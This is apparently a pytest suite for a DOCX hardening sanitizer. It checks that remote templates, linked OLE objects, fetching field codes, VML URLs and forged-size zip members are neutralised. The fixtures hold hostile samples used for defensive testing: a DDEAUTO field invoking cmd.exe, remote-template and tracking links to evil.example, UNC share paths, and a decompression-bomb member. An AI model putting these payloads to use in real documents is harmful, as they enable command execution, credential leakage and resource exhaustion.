"""렌더 사본 docx 하드닝(app/docx_harden.py — FileMergeManager spec_병합 ② §2-4 「렌더 하드닝」, 검토 U61a·11-01 astra·fable) —
FileMergeManager tests/test_render_hardening.py 의 strip_external 시험을 옮긴 것. Word 는 띄우지 않는다."""
import contextlib
import io
import re
import struct
import tracemalloc
import zipfile
import zlib

import pytest
from lxml import etree

from app import docx_harden as h

MB = 1024 * 1024
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG = "http://schemas.openxmlformats.org/package/2006/relationships"
RT = R + "/"
DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'


# ---- 렌더 사본의 바깥 관계 ----------------------------------------------------------------------------------

def _rels(*rows):
    body = "".join(f'<Relationship Id="{i}" Type="{RT}{t}" Target="{target}"'
                   + (' TargetMode="External"' if ext else "") + "/>" for i, t, target, ext in rows)
    return f'{DECL}<Relationships xmlns="{PKG}">{body}</Relationships>'


DOCUMENT = (f'{DECL}<w:document xmlns:w="{W}" xmlns:r="{R}" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"'
            ' xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"'
            ' xmlns:x="urn:test:unknown"><w:body>'
            '<w:p><w:hyperlink r:id="rIdH"><w:r><w:t>link</w:t></w:r></w:hyperlink></w:p>'
            '<w:p><w:r><w:drawing><a:blip r:embed="rIdImg"/></w:drawing></w:r></w:p>'
            '<w:p><w:r><w:drawing><a:blip r:embed="rIdImg" r:link="rIdLink"/></w:drawing></w:r></w:p>'
            '<w:p><w:r><w:object><v:shape><v:imagedata r:id="rIdImg"/></v:shape>'
            '<o:OLEObject Type="Link" ProgID="Excel.Sheet.12" r:id="rIdOle" UpdateMode="Always"/></w:object></w:r></w:p>'
            '<w:p><w:subDoc r:id="rIdSub"/></w:p>'
            '<w:p><w:r><x:thing r:id="rIdU"/></w:r></w:p>'
            '</w:body></w:document>')
SETTINGS = (f'{DECL}<w:settings xmlns:w="{W}" xmlns:r="{R}"><w:zoom w:percent="100"/><w:updateFields w:val="true"/>'
            '<w:attachedTemplate r:id="rId1"/><w:mailMerge><w:mainDocumentType w:val="formLetters"/>'
            '<w:dataSource r:id="rId2"/></w:mailMerge><w:defaultTabStop w:val="800"/></w:settings>')
WEB = (f'{DECL}<w:webSettings xmlns:w="{W}" xmlns:r="{R}"><w:frameset><w:frame><w:name w:val="f1"/>'
       '<w:sourceFileName r:id="rIdF"/></w:frame></w:frameset><w:optimizeForBrowser/></w:webSettings>')
CT = (f'{DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
      '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
      '<Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/></Types>')
STYLES = f'{DECL}<w:styles xmlns:w="{W}"><w:style w:styleId="a"/></w:styles>'


def _docx(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, body in members.items():
            z.writestr(name, body.encode() if isinstance(body, str) else body)
    return buf.getvalue()


def _members(data):
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return {n: z.read(n) for n in z.namelist()}, z.namelist()


def _crafted():
    return {
        "[Content_Types].xml": CT,
        "_rels/.rels": _rels(("rId1", "officeDocument", "word/document.xml", False)),
        "word/document.xml": DOCUMENT,
        "word/_rels/document.xml.rels": _rels(
            ("rIdH", "hyperlink", "https://example.com/", True),
            ("rIdImg", "image", "media/image1.png", False),
            ("rIdLink", "image", "http://evil.example/track.png", True),
            ("rIdOle", "oleObject", "file:///\\\\evil\\share\\book.xlsx", True),
            ("rIdSub", "subDocument", "file:///C:\\x\\sub.docx", True),
            ("rIdU", "unknownThing", "http://evil.example/u", True),
            ("rIdSt", "styles", "styles.xml", False)),
        "word/settings.xml": SETTINGS,
        "word/_rels/settings.xml.rels": _rels(
            ("rId1", "attachedTemplate", "http://evil.example/t.dotm", True),
            ("rId2", "mailMergeSource", "file:///C:\\data.xlsx", True)),
        "word/webSettings.xml": WEB,
        "word/_rels/webSettings.xml.rels": _rels(("rIdF", "frame", "http://evil.example/frame.docx", True)),
        "word/styles.xml": STYLES,
        "word/media/image1.png": b"\x89PNG\r\n\x1a\nfake",
    }


def _rel_map(raw):
    return {r.get("Id"): r for r in etree.fromstring(raw)}


def _ref_ids(raw):
    """부분 XML 안 관계 참조(r:* 속성) 값 전부."""
    return {v for el in etree.fromstring(raw).iter() if isinstance(el.tag, str)
            for k, v in el.attrib.items() if k.startswith("{" + R + "}")}


def test_strip_external_removes_remote_template_and_fetching_links():
    data = _docx(_crafted())
    out = h.strip_external(data)
    got, order = _members(out)
    src, src_order = _members(data)
    assert order == src_order  # 멤버 순서 그대로
    changed = {n for n in src if got[n] != src[n]}
    assert changed == {"word/document.xml", "word/_rels/document.xml.rels", "word/settings.xml",
                       "word/_rels/settings.xml.rels", "word/webSettings.xml", "word/_rels/webSettings.xml.rels"}
    # 원격 템플릿 — 관계와 요소 함께. 편지 병합 데이터·열 때 필드 갱신도 뺀다
    settings = etree.fromstring(got["word/settings.xml"])
    assert [etree.QName(c).localname for c in settings] == ["zoom", "defaultTabStop"]
    assert got["word/settings.xml"].startswith(DECL.strip().encode())  # 선언 그대로
    assert _rel_map(got["word/_rels/settings.xml.rels"]) == {}
    # 프레임
    web = etree.fromstring(got["word/webSettings.xml"])
    assert web.find(f"{{{W}}}frameset/{{{W}}}frame") is None and web.find(f"{{{W}}}optimizeForBrowser") is not None
    assert _rel_map(got["word/_rels/webSettings.xml.rels"]) == {}
    # 본문: 연결 그림은 r:link 만 떼고(박힌 그림 그대로), 연결 OLE·하위 문서는 요소째, 하이퍼링크는 남김
    rels = _rel_map(got["word/_rels/document.xml.rels"])
    assert set(rels) == {"rIdH", "rIdImg", "rIdU", "rIdSt"}
    assert rels["rIdH"].get("Target") == "https://example.com/" and rels["rIdH"].get("TargetMode") == "External"
    doc = got["word/document.xml"].decode()
    assert "r:link" not in doc and doc.count('r:embed="rIdImg"') == 2 and 'v:imagedata r:id="rIdImg"' in doc
    assert "OLEObject" not in doc and "subDoc" not in doc and '<w:hyperlink r:id="rIdH">' in doc
    # 모르는 요소가 참조하는 바깥 관계는 남기되 원격 대상을 지운다(참조가 끊겨 Word 가 손상 파일로 보지 않게)
    assert 'x:thing r:id="rIdU"' in doc and rels["rIdU"].get("TargetMode") == "External"
    assert not re.match(r"[a-z][a-z0-9+.-]*:|[\\/]", rels["rIdU"].get("Target"), re.I)  # 원격·절대 경로 아님
    # 끊긴 참조 없음
    for part, rel in (("word/document.xml", "word/_rels/document.xml.rels"), ("word/settings.xml", "word/_rels/settings.xml.rels"),
                      ("word/webSettings.xml", "word/_rels/webSettings.xml.rels")):
        assert _ref_ids(got[part]) <= set(_rel_map(got[rel]))
    # 다시 돌려도 더 바뀌지 않는다
    assert h.strip_external(out) == out


def test_strip_external_leaves_clean_document_and_non_zip_alone():
    members = _crafted()
    members["word/document.xml"] = (f'{DECL}<w:document xmlns:w="{W}" xmlns:r="{R}"><w:body><w:p><w:hyperlink r:id="rIdH">'
                                    '<w:r><w:t>link</w:t></w:r></w:hyperlink></w:p></w:body></w:document>')
    members["word/_rels/document.xml.rels"] = _rels(("rIdH", "hyperlink", "https://example.com/", True),
                                                    ("rIdSt", "styles", "styles.xml", False))
    members["word/settings.xml"] = f'{DECL}<w:settings xmlns:w="{W}"><w:zoom w:percent="100"/></w:settings>'
    for n in ("word/_rels/settings.xml.rels", "word/webSettings.xml", "word/_rels/webSettings.xml.rels"):
        del members[n]
    data = _docx(members)
    assert h.strip_external(data) == data
    assert h.strip_external(b"not a zip") == b"not a zip"


# ---- 구현 검토(11-01, astra·fable): settings 파트·mc:AlternateContent·VML 직접 URL·필드 코드·조각 읽기 ----------------------

MC = "http://schemas.openxmlformats.org/markup-compatibility/2006"
W14 = "http://schemas.microsoft.com/office/word/2010/wordml"
V = "urn:schemas-microsoft-com:vml"
O = "urn:schemas-microsoft-com:office:office"
A = "http://schemas.openxmlformats.org/drawingml/2006/main"
NS = f'xmlns:w="{W}" xmlns:r="{R}" xmlns:v="{V}" xmlns:o="{O}" xmlns:a="{A}" xmlns:mc="{MC}"'
PNG = b"\x89PNG\r\n\x1a\nfake"
DROP = {"attachedTemplate", "mailMerge", "updateFields"}


def _package(body="<w:p/>", doc_rels=(), settings=None, settings_name="word/settings.xml", settings_rels=None, extra=None,
             settings_target=None):
    """작은 docx — 본문 body, document 관계(styles + settings + doc_rels), settings 는 settings_name 에(관계 Type 으로 걸림 —
    대상 글은 settings_target, 없으면 word/ 기준 상대 경로)."""
    rows = [("rIdSt", "styles", "styles.xml", False), *doc_rels]
    members = {"[Content_Types].xml": CT, "_rels/.rels": _rels(("rId1", "officeDocument", "word/document.xml", False)),
               "word/document.xml": f'{DECL}<w:document {NS}><w:body>{body}</w:body></w:document>',
               "word/styles.xml": STYLES, "word/media/image1.png": PNG}
    if settings is not None:
        target = settings_target or (settings_name[len("word/"):] if settings_name.startswith("word/") else "../" + settings_name)
        rows.append(("rIdSet", "settings", target, False))
        members[settings_name] = settings
        if settings_rels is not None:
            folder, _, leaf = settings_name.rpartition("/")
            members[f"{folder}/_rels/{leaf}.rels"] = settings_rels
    members["word/_rels/document.xml.rels"] = _rels(*rows)
    members.update(extra or {})
    return _docx(members)


def _changed(data, out):
    src, order = _members(data)
    got, got_order = _members(out)
    assert got_order == order  # 멤버 순서 그대로
    return {n for n in src if got[n] != src[n]}, got


def _local(el):
    return etree.QName(el).localname


@pytest.mark.parametrize("name,target", [("word/options.xml", "options.xml"), ("word/options.xml", "/word/options.xml"),
                                         ("cfg/opts.xml", "../cfg/opts.xml"),
                                         ("word/Opt ions.xml", "opt%20ions.xml")])  # 부분 이름은 대소문자·% 인코딩 무관(OPC)
def test_settings_part_is_found_through_relationship_type(name, target):
    """astra 재현: settings 관계가 word/options.xml 을 가리키면 고정 이름(settings.xml)만 보던 코드는 w:updateFields 를 그대로 뒀다."""
    settings = (f'{DECL}<w:settings {NS}><w:zoom w:percent="100"/><w:updateFields w:val="true"/>'
                '<w:attachedTemplate r:id="rT"/><w:mailMerge><w:mainDocumentType w:val="formLetters"/></w:mailMerge></w:settings>')
    folder, _, leaf = name.rpartition("/")
    data = _package(settings=settings, settings_name=name, settings_target=target,
                    settings_rels=_rels(("rT", "attachedTemplate", "http://evil.example/t.dotm", True)))
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {name, f"{folder}/_rels/{leaf}.rels"}  # 나머지는 바이트 그대로
    assert [_local(c) for c in etree.fromstring(got[name])] == ["zoom"]
    assert _rel_map(got[f"{folder}/_rels/{leaf}.rels"]) == {}
    assert h.strip_external(out) == out


def test_settings_drops_inside_every_alternate_content_branch():
    settings = (f'{DECL}<w:settings {NS} xmlns:w14="{W14}" mc:Ignorable="w14"><w:zoom w:percent="100"/>'
                '<mc:AlternateContent><mc:Choice Requires="w14"><w:updateFields w:val="true"/>'
                '<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataSource r:id="rD"/></w:mailMerge></mc:Choice>'
                '<mc:Fallback><w:updateFields w:val="true"/><w:attachedTemplate r:id="rT"/></mc:Fallback></mc:AlternateContent>'
                '<w:updateFields w:val="true"/><w:defaultTabStop w:val="800"/></w:settings>')
    data = _package(settings=settings, settings_rels=_rels(("rT", "attachedTemplate", "http://evil.example/t.dotm", True),
                                                          ("rD", "mailMergeSource", "file:///C:\\data.xlsx", True)))
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/settings.xml", "word/_rels/settings.xml.rels"}
    root = etree.fromstring(got["word/settings.xml"])
    assert not [el for el in root.iter() if isinstance(el.tag, str) and _local(el) in DROP]
    assert [_local(c) for c in root] == ["zoom", "AlternateContent", "defaultTabStop"]
    assert [_local(c) for c in root.find(f"{{{MC}}}AlternateContent")] == ["Choice", "Fallback"]  # 가지는 남긴다(빈 가지도 성립)
    assert _rel_map(got["word/_rels/settings.xml.rels"]) == {} and not _ref_ids(got["word/settings.xml"])
    assert h.strip_external(out) == out


def test_vml_direct_url_and_unc_sources_are_removed_but_elements_kept():
    body = ('<w:p><w:r><w:pict><v:shape id="s1" href="http://evil.example/click"><v:imagedata src="https://evil.example/a.png"'
            ' o:title="a"/></v:shape></w:pict></w:r></w:p>'
            r'<w:p><w:r><w:pict><v:shape id="s2"><v:imagedata src="\\server\share\x.png"/>'
            '<v:fill src="//server/share/y.png" type="frame"/></v:shape></w:pict></w:r></w:p>'
            '<w:p><w:r><w:pict><v:shape id="s3"><v:imagedata o:href="file:///C:/x.png" r:id="rIdImg"/></v:shape></w:pict></w:r></w:p>'
            '<w:p><w:r><w:pict><v:shape id="s4"><v:imagedata src="image001.png"/></v:shape></w:pict></w:r></w:p>')
    header = (f'{DECL}<w:hdr {NS}><w:p><w:r><mc:AlternateContent><mc:Choice Requires="wps"><w:drawing/></mc:Choice>'
              '<mc:Fallback><w:pict><v:rect><v:fill src="ftp://evil.example/f.png"/></v:rect></w:pict></mc:Fallback>'
              '</mc:AlternateContent></w:r></w:p></w:hdr>')
    data = _package(body, doc_rels=[("rIdImg", "image", "media/image1.png", False), ("rIdHd", "header", "header1.xml", False)],
                    extra={"word/header1.xml": header})
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/document.xml", "word/header1.xml"}
    for part in ("word/document.xml", "word/header1.xml"):
        root = etree.fromstring(got[part])
        vml = [el for el in root.iter(f"{{{V}}}*")]
        left = [v for el in vml for k, v in el.attrib.items() if etree.QName(k).localname in ("src", "href")]
        assert all(not re.match(r"[a-z][a-z0-9+.-]+:|[\\/]{2}", v, re.I) for v in left), left
    doc = etree.fromstring(got["word/document.xml"])
    images = doc.findall(f".//{{{V}}}imagedata")
    assert len(images) == 4 and len(doc.findall(f".//{{{V}}}fill")) == 1  # 요소는 남김
    assert images[0].get(f"{{{O}}}title") == "a" and images[2].get(f"{{{R}}}id") == "rIdImg"  # 다른 속성·박힌 그림 참조 그대로
    assert images[3].get("src") == "image001.png"  # 상대 경로는 그대로(문서 폴더 = 렌더 임시 폴더)
    assert h.strip_external(out) == out


FETCH = re.compile(r"\s*(INCLUDEPICTURE|INCLUDETEXT|LINK|DDEAUTO|DDE)\b", re.I)


def _codes(raw):
    """부분 XML -> (복합 필드마다 자기 명령(begin 순, 안긴 필드는 '{}'), fldChar 종류 열, 단순 필드 명령, 결과·본문 글)."""
    root = etree.fromstring(raw)
    stack, codes, kinds = [], [], []
    for el in root.iter(f"{{{W}}}fldChar", f"{{{W}}}instrText"):
        if _local(el) == "fldChar":
            kind = el.get(f"{{{W}}}fldCharType")
            kinds.append(kind)
            if kind == "begin":
                if stack and not stack[-1][1]:
                    stack[-1][0].append("{}")
                codes.append([])
                stack.append([codes[-1], False])
            elif kind == "separate":
                stack[-1][1] = True
            else:
                stack.pop()
        elif stack and not stack[-1][1]:
            stack[-1][0].append(el.text or "")
    simple = [el.get(f"{{{W}}}instr") for el in root.iter(f"{{{W}}}fldSimple")]
    return ["".join(c) for c in codes], kinds, simple, [t.text for t in root.iter(f"{{{W}}}t")]


def _complex(*instr, result="", sep=True):
    runs = "".join(f'<w:r><w:instrText xml:space="preserve">{x}</w:instrText></w:r>' if isinstance(x, str) else x[0] for x in instr)
    tail = (f'<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>{result}</w:t></w:r>' if sep else "")
    return f'<w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}{tail}<w:r><w:fldChar w:fldCharType="end"/></w:r>'


def test_fetching_field_codes_are_neutralised_without_breaking_field_structure():
    nested = _complex(' QUOTE "http://evil.example/n.png" ', result="http://evil.example/n.png")
    dynamic = _complex(' QUOTE "INCLUDEPICTURE" ', result="INCLUDEPICTURE")
    body = ("<w:p>" + _complex(" INCLUDEP", 'ICTURE "http://ev', r'il.example/x.png" \d ', result="cached-1") + "</w:p>"  # 런에 나뉨
            + r'''<w:p><w:fldSimple w:instr=' includeText "\\server\share\a.docx" '><w:r><w:t>cached-2</w:t></w:r></w:fldSimple></w:p>'''
            + "<w:p>" + _complex(r' link Excel.Sheet.12 "\\server\b.xlsx" "Sheet1!R1C1" \a \p ', result="cached-3") + "</w:p>"
            + "<w:p>" + _complex(r'DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc"', sep=False) + "</w:p>"
            + "<w:p>" + _complex(' INCLUDEPICTURE "', (nested,), r'" \d ', result="cached-5") + "</w:p>"  # 대상이 안긴 필드
            + "<w:p>" + _complex(" ", (dynamic,), r' "http://evil.example/d.png" \d ', result="cached-6") + "</w:p>"  # 종류가 안긴 필드
            + "<w:p>" + _complex(" PAGE ", result="7") + _complex(' HYPERLINK "https://example.com/" ', result="cached-8") + "</w:p>"
            + '<w:p><w:fldSimple w:instr=" NUMPAGES "><w:r><w:t>9</w:t></w:r></w:fldSimple></w:p>')
    header = f'{DECL}<w:hdr {NS}><w:p>' + _complex(' DDE Excel "C:\\\\x.xlsx" "R1C1" ', result="cached-h") + "</w:p></w:hdr>"
    data = _package(body, doc_rels=[("rIdHd", "header", "header1.xml", False)], extra={"word/header1.xml": header})
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/document.xml", "word/header1.xml"}
    before, after = _codes(_members(data)[0]["word/document.xml"]), _codes(got["word/document.xml"])
    assert after[1] == before[1]  # begin·separate·end 구조 그대로
    assert after[3] == before[3]  # 캐시된 결과 글 그대로
    codes, simple = after[0], after[2]
    for i in (0, 1, 2, 3, 5):  # 바깥을 부르는 필드 — 명령 첫머리부터 무해한 QUOTE, 원래 대상 없음
        assert re.match(r'\s*QUOTE ""', codes[i]) and not re.search(r"evil|server|cmd|INCLUDE|LINK|DDE", codes[i], re.I), codes[i]
    assert codes[4] == before[0][4] and codes[6] == before[0][6]  # 안긴 QUOTE 는 그대로
    assert codes[7] == " PAGE " and codes[8] == before[0][8]  # 바깥을 부르지 않는 필드·하이퍼링크는 그대로
    assert re.match(r'\s*QUOTE ""\s*$', simple[0]) and simple[1] == " NUMPAGES "
    hcodes = _codes(got["word/header1.xml"])[0]
    assert re.match(r'\s*QUOTE ""', hcodes[0]) and "x.xlsx" not in hcodes[0]
    for part in ("word/document.xml", "word/header1.xml"):
        root = etree.fromstring(got[part])
        assert not any(FETCH.match(el.get(f"{{{W}}}instr") or "") for el in root.iter(f"{{{W}}}fldSimple"))
    assert h.strip_external(out) == out


def test_text_runs_between_begin_and_separate_count_as_field_code():
    """begin 과 separate 사이 글은 w:t 로 적어도 필드 코드 — instrText 만 보면 놓친다."""
    body = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:t xml:space="preserve"> INCLUDEPICTURE </w:t></w:r>'
            r'<w:r><w:t>"http://evil.example/t.png" \d</w:t></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            '<w:r><w:t>cached</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    data = _package(body)
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/document.xml"}
    codes, kinds, _, texts = _codes(got["word/document.xml"])
    assert re.match(r'\s*QUOTE ""\s*$', codes[0]) and kinds == ["begin", "separate", "end"]
    assert "evil" not in got["word/document.xml"].decode() and "cached" in texts
    assert h.strip_external(out) == out


def test_field_update_on_open_flags_are_removed():
    """필드마다의 「열 때 갱신」(w:dirty) — settings 의 w:updateFields 와 같은 확인 창·갱신."""
    body = ('<w:p><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText> TOC \\o </w:instrText></w:r>'
            '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>toc</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
            '<w:p><w:fldSimple w:instr=" DATE " w:dirty="1"><w:r><w:t>d</w:t></w:r></w:fldSimple></w:p>')
    data = _package(body)
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/document.xml"}
    assert b"dirty" not in got["word/document.xml"] and _codes(got["word/document.xml"])[0] == [" TOC \\o "]


def test_hyperlinks_are_kept_but_fetching_references_through_them_are_not():
    body = ('<w:p><w:hyperlink r:id="rIdH"><w:r><w:t>web</w:t></w:r></w:hyperlink>'
            '<w:hyperlink r:id="rIdUnc"><w:r><w:t>unc</w:t></w:r></w:hyperlink></w:p>'
            '<w:p><w:r><w:drawing><a:blip r:embed="rIdImg" r:link="rIdSpoof"/></w:drawing></w:r></w:p>'
            '<w:p><w:r><w:drawing><a:blip r:link="rIdAbs"/></w:drawing></w:r></w:p>')
    data = _package(body, doc_rels=[("rIdH", "hyperlink", "https://example.com/", True),
                                    ("rIdUnc", "hyperlink", "file://///server/share/doc.docx", True),  # 누를 때만 — 남김
                                    ("rIdImg", "image", "media/image1.png", False),
                                    ("rIdSpoof", "hyperlink", "http://evil.example/p.png", True),  # 하이퍼링크 Type 으로 그림을 부름
                                    ("rIdAbs", "image", "http://evil.example/q.png", False)])  # 내부 관계인데 대상이 직접 URL
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/document.xml", "word/_rels/document.xml.rels"}
    rels = _rel_map(got["word/_rels/document.xml.rels"])
    assert set(rels) == {"rIdSt", "rIdH", "rIdUnc", "rIdImg"}
    assert rels["rIdUnc"].get("Target") == "file://///server/share/doc.docx"
    doc = got["word/document.xml"].decode()
    assert "r:link" not in doc and 'r:embed="rIdImg"' in doc and doc.count("<w:hyperlink") == 2
    assert _ref_ids(got["word/document.xml"]) <= set(rels)
    assert h.strip_external(out) == out


# ---- 조각 읽기 — 선언 크기를 속인 멤버가 메모리를 다 쓰지 않는다 ---------------------------------------------------------

def _forge_size(data, member, size):
    """member 의 선언 해제 크기(중앙 디렉터리·로컬 머리)를 size 로, CRC 를 실제 앞 size 바이트의 것으로 속인다 — 압축 데이터는 그대로라
    ZipFile.read() 는 끝까지 해제한 뒤 자른다(spec_왕복_어댑터 ① 11-01: 65 KB 위조 zip 이 141 MiB)."""
    buf = bytearray(data)
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        info = z.getinfo(member)
        with z.open(info) as f:
            crc = zlib.crc32(f.read(size))
        at = z.start_dir
    struct.pack_into("<I", buf, info.header_offset + 14, crc)
    struct.pack_into("<I", buf, info.header_offset + 22, size)
    while buf[at:at + 4] == b"PK\x01\x02":
        n, m, k = struct.unpack_from("<HHH", buf, at + 28)
        if buf[at + 46:at + 46 + n].decode() == member:
            struct.pack_into("<I", buf, at + 16, crc)
            struct.pack_into("<I", buf, at + 24, size)
        at += 46 + n + m + k
    return bytes(buf)


def _with_big_member(member, mib):
    """_crafted() 문서(고칠 것이 있어 다시 묶음)의 member 를 0 바이트 mib MiB 로 — 1 MiB 씩 써서 시험 쪽은 메모리를 쓰지 않는다."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, body in _crafted().items():
            if name != member:
                z.writestr(name, body.encode() if isinstance(body, str) else body)
                continue
            with z.open(name, "w") as f:
                for _ in range(mib):
                    f.write(bytes(MB))
    return _forge_size(buf.getvalue(), member, 12)


@pytest.mark.parametrize("member", ["word/media/image1.png", "word/settings.xml"])
def test_forged_size_member_is_read_in_bounded_chunks(member):
    data = _with_big_member(member, 64)
    assert len(data) < MB  # 64 MiB 를 담은 1 MiB 미만 zip
    tracemalloc.start()
    try:
        with contextlib.suppress(ValueError, zipfile.BadZipFile):  # 위조를 알아채 거부해도 되고, 선언 크기까지만 읽어도 된다
            h.strip_external(data)
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 16 * MB, f"peak {peak / MB:.1f} MiB"


# ---- 재검토(11-01, astra): XML 파트 판정·읽을 수 없는 멤버·열어 둔 PDF 캐시 ----------------------------------------------------

HDR = "application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"
CT_MORE = (f'{DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
           '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
           '<Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>'
           '<Default Extension="bin" ContentType="application/octet-stream"/>'
           '<Default Extension="odttf" ContentType="application/vnd.openxmlformats-officedocument.obfuscatedFont"/>'
           f'<Override PartName="/word/Header1.HDR" ContentType="{HDR}"/></Types>')  # 부분 이름은 대소문자 무관(OPC)


def _pad(xml, prefix):
    """선언 없는 XML 글 앞에 prefix(공백·BOM) — 앞 512바이트만 보던 판정을 피하던 꼴. 'utf-16' 이면 BOM·공백·글 모두 UTF-16LE."""
    if prefix == "utf-16":
        return ("﻿" + " " * 600 + xml).encode("utf-16-le")
    return prefix + xml.encode()


@pytest.mark.parametrize("prefix", [b" " * 600, b"\xef\xbb\xbf" + b" " * 600, b"\r\n\t " * 200, "utf-16"],
                         ids=["spaces", "bom-spaces", "mixed-ws", "utf16"])
def test_xml_parts_behind_leading_whitespace_are_still_cleaned(prefix):
    """astra 재현: 루트 앞 공백 512개(선언 없음)면 앞 512바이트만 보던 판정이 settings·본문을 건너뛰어 w:updateFields·VML https src·
    INCLUDEPICTURE 가 남았다. 이름(.xml)·Content_Types(Override)·관계 대상 + 내용(BOM·공백 뒤 '<') 모두로 본다."""
    settings = f'<w:settings {NS}><w:zoom w:percent="100"/><w:updateFields w:val="true"/></w:settings>'
    body = ('<w:p><w:r><w:pict><v:shape id="s1"><v:imagedata src="https://evil.example/a.png"/></v:shape></w:pict></w:r></w:p>'
            "<w:p>" + _complex(' INCLUDEPICTURE "http://evil.example/x.png" \\d ', result="cached") + "</w:p>")
    header = (f'<w:hdr {NS}><w:p><w:fldSimple w:instr=\' INCLUDEPICTURE "http://evil.example/h.png" \'>'
              '<w:r><w:t>h</w:t></w:r></w:fldSimple></w:p></w:hdr>')  # Content_Types Override 로 XML(이름은 .hdr)
    footer = (f'<w:ftr {NS}><w:p><w:r><w:pict><v:rect><v:fill src="//server/share/f.png"/></v:rect></w:pict></w:r></w:p>'
              '</w:ftr>')  # 관계 대상 — Content_Types 로는 바이너리(.bin), 내용으로 XML
    document = _pad(f"<w:document {NS}><w:body>{body}</w:body></w:document>", prefix)
    data = _package(doc_rels=[("rIdHd", "header", "header1.hdr", False), ("rIdFt", "footer", "footer1.bin", False)],
                    settings=_pad(settings, prefix),
                    extra={"[Content_Types].xml": CT_MORE, "word/document.xml": document,
                           "word/header1.hdr": _pad(header, prefix), "word/footer1.bin": _pad(footer, prefix)})
    out = h.strip_external(data)
    changed, got = _changed(data, out)
    assert changed == {"word/settings.xml", "word/document.xml", "word/header1.hdr", "word/footer1.bin"}
    assert [_local(c) for c in etree.fromstring(got["word/settings.xml"])] == ["zoom"]
    for part in changed:
        assert b"evil" not in got[part] and b"server" not in got[part], part
    codes, kinds, _, texts = _codes(got["word/document.xml"])
    assert re.match(r'\s*QUOTE ""\s*$', codes[0]) and kinds == ["begin", "separate", "end"] and "cached" in texts
    assert re.match(r'\s*QUOTE ""\s*$', _codes(got["word/header1.hdr"])[2][0])
    assert etree.fromstring(got["word/footer1.bin"]).find(f".//{{{V}}}fill") is not None  # 요소는 남김
    assert h.strip_external(out) == out


def _bad_crc(data, member):
    """member 의 CRC(중앙 디렉터리·로컬 머리)를 틀리게 — 풀면 「Bad CRC-32」."""
    buf = bytearray(data)
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        info, at = z.getinfo(member), z.start_dir
    struct.pack_into("<I", buf, info.header_offset + 14, info.CRC ^ 0xFFFFFFFF)
    while buf[at:at + 4] == b"PK\x01\x02":
        n, m, k = struct.unpack_from("<HHH", buf, at + 28)
        if buf[at + 46:at + 46 + n].decode() == member:
            struct.pack_into("<I", buf, at + 16, info.CRC ^ 0xFFFFFFFF)
        at += 46 + n + m + k
    return bytes(buf)


def test_unreadable_member_fails_instead_of_passing_the_original(monkeypatch):
    """조각 읽기(zip_guard.read)가 거부한 멤버 — 앞 공백으로 판정을 피한 settings 라도 원본을 그대로 넘기지 않고 렌더 실패(ValueError)."""
    settings = _pad(f'<w:settings {NS}><w:updateFields w:val="true"/></w:settings>', b" " * 600)
    data = _package(settings=settings)
    read = h.zip_guard.read

    def forged(zf, member):
        name = member if isinstance(member, str) else member.filename
        if name == "word/settings.xml":
            raise ValueError("zip 멤버 크기가 선언과 다름(word/settings.xml)")
        return read(zf, member)

    monkeypatch.setattr(h.zip_guard, "read", forged)
    with pytest.raises(ValueError):
        h.strip_external(data)


def test_corrupt_binary_member_fails_even_when_nothing_needs_fixing():
    """고칠 것이 없는 문서라도 CRC 가 틀린 그림 멤버가 있으면 받은 바이트를 그대로 넘기지 않는다."""
    clean = _package()
    assert h.strip_external(clean) == clean
    with pytest.raises(ValueError):
        h.strip_external(_bad_crc(clean, "word/media/image1.png"))


@pytest.mark.parametrize("name,ok", [("word/header1.hdr", False),  # Content_Types Override 로 XML — 못 읽으면 렌더 실패
                                     ("word/styles.xml", False),  # .xml 이름
                                     ("word/fonts/font1.odttf", True)])  # 바이너리(가린 글꼴)가 우연히 '<' 로 시작 — 그대로
def test_part_that_must_be_xml_but_does_not_parse_fails_render(name, ok):
    junk = b"  <w:hdr \x93\x00\xff garbage"
    data = _package(extra={"[Content_Types].xml": CT_MORE, name: junk})
    if ok:
        assert h.strip_external(data) == data
    else:
        with pytest.raises(ValueError):
            h.strip_external(data)
